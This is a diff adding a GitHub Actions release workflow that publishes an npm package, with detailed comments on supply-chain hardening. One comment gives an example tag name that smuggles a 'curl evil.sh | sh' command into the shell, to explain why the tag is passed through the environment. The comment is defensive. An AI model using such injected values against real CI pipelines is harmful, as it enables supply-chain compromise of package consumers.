@@ -1,0 +1,107 @@
+name: Release
+
+# Publishes to GitHub Packages when a v* tag is pushed.
+#
+# The tag is the trigger, but package.json is the source of truth for what gets
+# published — npm reads the version from there and ignores the tag entirely.
+# release-guard.sh exists to stop those two disagreeing silently; see
+# docs/RELEASE.md for the procedure and what this automation does not cover.
+
+on:
+  push:
+    tags: ["v*"]
+
+permissions:
+  contents: read
+  packages: write
+
+# One release at a time. Two tags pushed close together would otherwise race,
+# and the loser fails against the registry rather than against this guard.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      # Actions are pinned to commit SHAs, not floating tags, in THIS workflow
+      # specifically. A moved tag on a third-party action would run its author's
+      # code in the one job that holds `packages: write` and a checkout token.
+      # ci.yml keeps floating tags deliberately — it cannot publish anything.
+      # Cost, stated because pins have one: these do not pick up upstream fixes
+      # on their own and need refreshing periodically.
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+        with:
+          # Full history: release-ancestry.sh compares the tagged commit against
+          # origin/main, and the default shallow clone cannot answer that.
+          fetch-depth: 0
+
+      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2
+
+      # First, and before anything expensive: a tag that disagrees with
+      # package.json must fail here rather than publish the wrong version
+      # successfully.
+      # The tag name goes through the environment, NOT through `${{ }}`
+      # interpolation into the shell body. Direct interpolation splices the ref
+      # name into the script source before bash sees it, so a tag named
+      # `v1.0.0"; curl evil.sh | sh; "` would execute — in a job holding
+      # `packages: write`, that is a supply-chain compromise, not a lint nit.
+      - name: Guard tag against package.json version
+        env:
+          TAG_NAME: ${{ github.ref_name }}
+        run: scripts/ci/release-guard.sh "$TAG_NAME"
+
+      # Belt-and-braces, and known to be redundant today. actions/checkout v4
+      # with fetch-depth: 0 uses `+refs/heads/*:refs/remotes/origin/*`
+      # unconditionally — the refspec is not gated on the checked-out ref being
+      # a branch — so origin/main is already populated when checking out a tag.
+      # Kept because the ancestry guard exits 2 without that ref, which would
+      # block every release; one cheap fetch makes the invariant ours rather
+      # than a property of a third-party action's current implementation.
+      - name: Fetch default branch for the ancestry check
+        run: git fetch --no-tags origin +refs/heads/main:refs/remotes/origin/main
+
+      # A tag can point at ANY commit, including an unmerged branch. The gate
+      # below proves the code passes its tests; it cannot prove anyone reviewed
+      # it. Without this, tagging an unmerged branch publishes it to every
+      # consumer with a green workflow.
+      - name: Guard against publishing an unmerged commit
+        run: scripts/ci/release-ancestry.sh main
+
+      - run: sudo apt-get install -y shellcheck
+
+      - run: bun install
+
+      # The full gate, re-run rather than trusted: "main was green" is not
+      # evidence about THIS ref, which may be an older or unmerged commit.
+      #
+      # WHAT THIS IS NOT. On a tag push GitHub runs this workflow FROM THE
+      # TAGGED COMMIT, and every script it calls — validate.sh, lint.sh,
+      # test.sh, and both guards above — comes from that same tree. A tree can
+      # neuter its own gate. So this, and every in-tree check here, is a control
+      # against MISTAKES (tagging before merge, tagging the wrong commit), not
+      # against whoever chose the tree.
+      #
+      # The only thing that constrains a deliberate tagger is a repo-side tag
+      # protection ruleset on `v*`, which lives in repo settings and not here.
+      # Branch protection on main does NOT cover tags. See docs/RELEASE.md.
+      - name: Full gate
+        run: scripts/ci/validate.sh
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with:
+          node-version: "22"
+          registry-url: "https://npm.pkg.github.com"
+          scope: "@wave-engineering"
+
+      # Behaviour, not config: pack it and read what came out. --require makes a
+      # missing npm fatal here, since a skipped check in the release path would
+      # be indistinguishable from a passing one.
+      - name: Verify tarball contents
+        run: scripts/ci/verify-tarball.sh --require
+
+      - name: Publish to GitHub Packages
+        run: npm publish
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
